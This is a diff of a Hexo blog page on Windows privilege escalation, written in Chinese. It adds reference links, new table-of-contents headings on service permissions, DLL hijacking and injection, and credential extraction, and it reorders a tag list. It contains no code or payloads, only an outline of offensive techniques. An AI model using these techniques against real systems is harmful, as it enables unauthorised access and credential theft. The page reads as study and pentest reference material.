-<h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="http://secvue.com/using-powerup-with-unquoted-service-paths/" target="_blank" rel="noopener">using-powerup-with-unquoted-service-paths</a><br><a href="https://www.gracefulsecurity.com/privesc-unquoted-service-path/" target="_blank" rel="noopener">privesc-unquoted-service-path</a><br>youtube - Windows Privilege Escalation<br><a href="https://pentestlab.blog/tag/cpassword/" target="_blank" rel="noopener">Group Policy Preferences</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp</a><br><a href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/" target="_blank" rel="noopener">windows-privilege-escalation-alwaysinstallelevated</a></p>
+<h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="http://secvue.com/using-powerup-with-unquoted-service-paths/" target="_blank" rel="noopener">using-powerup-with-unquoted-service-paths</a><br><a href="https://www.gracefulsecurity.com/privesc-unquoted-service-path/" target="_blank" rel="noopener">privesc-unquoted-service-path</a><br>youtube - Windows Privilege Escalation<br><a href="https://pentestlab.blog/tag/cpassword/" target="_blank" rel="noopener">Group Policy Preferences</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp</a><br><a href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/" target="_blank" rel="noopener">windows-privilege-escalation-alwaysinstallelevated</a><br><a href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">Windows渗透资料</a><br><a href="http://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html" target="_blank" rel="noopener">Ninjitsu</a><br><a href="http://www.computerhope.com/wmic.htm" target="_blank" rel="noopener">Ninjitsu</a><br><a href="https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="noopener">wmic_info.bat</a><br><a href="https://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank" rel="noopener">Badly patched</a><br><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/" target="_blank" rel="noopener">Windows Privilege Escalation Methods for Pentesters</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener">Windows - Privilege Escalation</a><br><a href="https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194" target="_blank" rel="noopener">tools</a><br><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">Windows Privilege Escalation Guide</a><br><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/my-5-top-ways-to-escalate-privileges/" target="_blank" rel="noopener">my-5-top-ways-to-escalate-privileges</a><br><a href="https://azeria-labs.com/privilege-escalation/" target="_blank" rel="noopener">escalate-privilege-with-cve</a><br><a href="https://adsecurity.org/?p=3658" target="_blank" rel="noopener">域用户组详解</a></p>
 
       
 
@@ -385,7 +419,7 @@ Server Message Block是WIndows下的一个协议，
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-MsSql-Escalate-Privilege"><span class="toc-number">1.1.</span> <span class="toc-text">0x10 MsSql Escalate Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MsSql基本操作"><span class="toc-number">1.1.1.</span> <span class="toc-text">MsSql基本操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章"><span class="toc-number">1.1.2.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x20-内核"><span class="toc-number">1.2.</span> <span class="toc-text">0x20 内核</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x21-服务"><span class="toc-number">1.3.</span> <span class="toc-text">0x21 服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#不带引号的服务路径"><span class="toc-number">1.3.1.</span> <span class="toc-text">不带引号的服务路径</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x22-dll"><span class="toc-number">1.4.</span> <span class="toc-text">0x22. dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x23-注册表"><span class="toc-number">1.5.</span> <span class="toc-text">0x23 注册表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x24-计划任务"><span class="toc-number">1.6.</span> <span class="toc-text">0x24 计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x25-文件"><span class="toc-number">1.7.</span> <span class="toc-text">0x25. 文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#从浏览器文件中提取凭证"><span class="toc-number">1.7.1.</span> <span class="toc-text">从浏览器文件中提取凭证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#从远控工具中提取凭证"><span class="toc-number">1.7.2.</span> <span class="toc-text">从远控工具中提取凭证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#组策略首选项文件"><span class="toc-number">1.7.3.</span> <span class="toc-text">组策略首选项文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows密钥文件"><span class="toc-number">1.7.4.</span> <span class="toc-text">Windows密钥文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x26-错误配置"><span class="toc-number">1.8.</span> <span class="toc-text">0x26 错误配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AlwaysInstallElevated"><span class="toc-number">1.8.1.</span> <span class="toc-text">AlwaysInstallElevated</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章-1"><span class="toc-number">1.8.2.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-MsSql-Escalate-Privilege"><span class="toc-number">1.1.</span> <span class="toc-text">0x10 MsSql Escalate Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MsSql基本操作"><span class="toc-number">1.1.1.</span> <span class="toc-text">MsSql基本操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章"><span class="toc-number">1.1.2.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x20-内核"><span class="toc-number">1.2.</span> <span class="toc-text">0x20 内核</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x21-服务"><span class="toc-number">1.3.</span> <span class="toc-text">0x21 服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#不带引号的服务路径"><span class="toc-number">1.3.1.</span> <span class="toc-text">不带引号的服务路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#不安全的服务权限"><span class="toc-number">1.3.2.</span> <span class="toc-text">不安全的服务权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x22-dll"><span class="toc-number">1.4.</span> <span class="toc-text">0x22. dll</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dll劫持"><span class="toc-number">1.4.1.</span> <span class="toc-text">dll劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-dll注入"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.dll注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x23-注册表"><span class="toc-number">1.5.</span> <span class="toc-text">0x23 注册表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x24-计划任务-Administrator-to-SYSTEM"><span class="toc-number">1.6.</span> <span class="toc-text">0x24 计划任务(Administrator to SYSTEM)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x25-文件"><span class="toc-number">1.7.</span> <span class="toc-text">0x25. 文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#从浏览器文件中提取凭证"><span class="toc-number">1.7.1.</span> <span class="toc-text">从浏览器文件中提取凭证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#从远控工具中提取凭证"><span class="toc-number">1.7.2.</span> <span class="toc-text">从远控工具中提取凭证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#组策略首选项文件"><span class="toc-number">1.7.3.</span> <span class="toc-text">组策略首选项文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows密钥文件"><span class="toc-number">1.7.4.</span> <span class="toc-text">Windows密钥文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x26-错误配置"><span class="toc-number">1.8.</span> <span class="toc-text">0x26 错误配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AlwaysInstallElevated"><span class="toc-number">1.8.1.</span> <span class="toc-text">AlwaysInstallElevated</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章-1"><span class="toc-number">1.8.2.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -519,150 +553,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ftp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">smbclient</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">PRTG</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">任意文件上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">cheatsheet</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">pip</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">wordpress</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ssh</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">udf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">joomla</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sudoers</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">jenkins</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">crontab</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">wmi</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pcap_analyze</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">url_brute</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">rce</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">甲方安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">防御方案</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">hexo美化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">内存越界访问</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">openssl</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">latex</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tty</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">search_file</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">waf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">cheetsheet</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">services</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">暴力破解</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">fuzz</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">mremoteng_decrypt</a>
               </li>
              
@@ -680,6 +570,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">escalage_privilege</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sudoers</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -704,6 +598,146 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Group Policy Preferences</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">任意文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ftp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">smbclient</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">PRTG</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">cheatsheet</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">pip</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">joomla</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">wordpress</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ssh</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">udf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">pcap_analyze</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">wmi</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">jenkins</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">crontab</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">甲方安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">防御方案</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">url_brute</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">rce</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">内存越界访问</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">openssl</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">hexo美化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">tty</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">latex</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">search_file</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">waf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">services</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">cheetsheet</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">fuzz</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">暴力破解</a>
               </li>
              
               <li class="article-tag-list-item">
